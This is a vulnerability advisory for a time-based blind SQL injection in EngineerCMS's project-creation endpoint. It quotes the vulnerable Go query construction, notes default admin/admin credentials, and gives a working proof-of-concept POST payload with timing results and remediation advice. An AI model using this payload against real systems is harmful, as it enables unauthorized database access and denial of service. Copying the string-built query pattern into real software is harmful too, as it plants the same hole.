# CVE-2025-44831 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-44831
- **CWE**: CWE-89 (SQL Injection)
- **Affected Software**: EngineerCMS v1.02 - v2.0.5
- **Vulnerability Type**: Time-Based Blind SQL Injection
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Description
EngineerCMS contains a SQL injection vulnerability in the `/project/addproject` interface. The `name` parameter is vulnerable to SQL injection through the `parenttitlepath` field in the `Insertproj()` function.

## Technical Details

### Vulnerable Code Location
File: `models/ProjModel.go`, function `Insertproj()`

```go
sql := fmt.Sprintf("insert into Project (Code, Title, Label, Principal, Parent_id, Parent_id_path, Parent_title_path, Grade,Created,Updated)"+
    " values('%s','%s','%s','%s',%d,'%s','%s',%d,'%s','%s')", code, title, "", "", parentid, parentidpath, parenttitlepath, grade, date, date)
res, err := o.Raw(sql).Exec()
```

### Attack Vector
1. Attacker logs in as admin (default: admin/admin)
2. System must have category data (admin_category table)
3. Attacker sends POST to `/project/addproject` with malicious `name` parameter
4. The `name` value flows through: `projname` -> `ParentTitle` -> `parenttitlepath`
5. `parenttitlepath` is concatenated into raw SQL query without sanitization

### Official Proof of Concept
```
POST /project/addproject HTTP/1.1

code=sd&name=dassda'and(case when(substr(sqlite_version(),1,1)='3')then randomblob(100000000)else 0 end),0,'','')--&label=&principal=&ids=1,2
```

### Exploitation Results
- Normal request time: ~40 ms
- SQLi request time: ~660 ms
- Time difference: ~620 ms (confirms SQL injection)

## Impact
- Database information disclosure via time-based blind SQL injection
- Potential database modification
- Denial of service through resource exhaustion

## Remediation
- Use parameterized queries instead of `fmt.Sprintf` + `Raw()`
- Update to a patched version when available
- Implement input validation and sanitization

## References
- https://github.com/3xxx/engineercms/issues/91
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-44831
